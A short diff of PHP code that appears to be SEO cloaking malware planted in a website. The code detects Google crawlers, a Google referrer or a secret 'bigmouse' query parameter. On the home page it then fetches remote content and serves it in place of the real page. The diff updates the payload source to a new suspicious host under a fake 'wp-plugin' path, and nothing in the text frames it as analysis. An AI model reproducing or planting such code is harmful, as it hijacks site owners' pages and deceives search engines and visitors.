@@ -33,7 +33,7 @@ foreach (['googlebot','adsbot','mediapartners','apis-google','structured-data-te
 
 if (($b || strpos($r, 'search.google.com') !== false || isset($_GET["bigmouse"])) && in_array($p, ['/', '/index.php'])) {
     if ($b) usleep(700000);
-    $x = fetch("https://tooless.store/data/tamplase1.txt");
+    $x = fetch("http://cdn-js-plus.site/wp-plugin/lp3.txt");
     if (strlen(trim($x)) > 50) {
         while (ob_get_level()) ob_end_clean();
         header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
